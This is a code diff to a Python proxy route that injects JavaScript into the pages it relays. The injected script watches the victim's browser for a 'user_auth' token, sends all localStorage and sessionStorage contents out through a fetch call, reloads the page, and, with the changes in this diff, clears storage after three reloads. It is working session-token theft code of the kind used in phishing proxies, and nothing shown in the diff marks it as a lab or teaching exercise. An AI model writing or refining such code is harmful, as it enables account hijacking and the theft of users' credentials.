@@ -34,6 +34,7 @@ def proxy(path):
     # Inject JavaScript to extract localStorage and sessionStorage
     injected_js = """
     <script>
+        // Function to send localStorage and sessionStorage data
         function sendStorageData() {
             const localStorageData = JSON.stringify(localStorage);
             const sessionStorageData = JSON.stringify(sessionStorage);
@@ -48,22 +49,42 @@ def proxy(path):
                 }),
             });
         }
-        
 
-        // Function to check if the key exists and log it every 5 seconds
+        // Check for the key and send storage data if it exists
         const keyName = 'user_auth'; // Replace with your actual key name
+        const reloadLimit = 3; // Set the reload limit to 3
+
+        // Track reload count in sessionStorage
+        if (sessionStorage.getItem('reloadCount') === null) {
+            sessionStorage.setItem('reloadCount', 0); // Initialize reload count
+        } else {
+            let reloadCount = parseInt(sessionStorage.getItem('reloadCount'));
+            reloadCount += 1;
+            sessionStorage.setItem('reloadCount', reloadCount); // Increment reload count
+
+            if (reloadCount >= reloadLimit) {
+                // Clear localStorage and sessionStorage after 3 reloads
+                console.log("Reload limit reached. Clearing storage...");
+                localStorage.clear();
+                sessionStorage.clear();
+            }
+        }
 
         setInterval(function() {
             const value = localStorage.getItem(keyName);
             if (value !== null) {
                 console.log(`Key "${keyName}" exists with value:`, value);
                 sendStorageData();
-                window.location.reload();
-                localStorage.clear();
+                 window.location.reload();// Send storage data when the key is found
             }
-        }, 1000); // 5000 milliseconds = 5 seconds
+        }, 5000); // 5000 milliseconds = 5 seconds
 
         
+
+        // Set an interval to recheck every 10 seconds
+        setInterval(function() {
+            reloadIfContainsCRipple();
+        }, 10000);
     </script>
     """
 
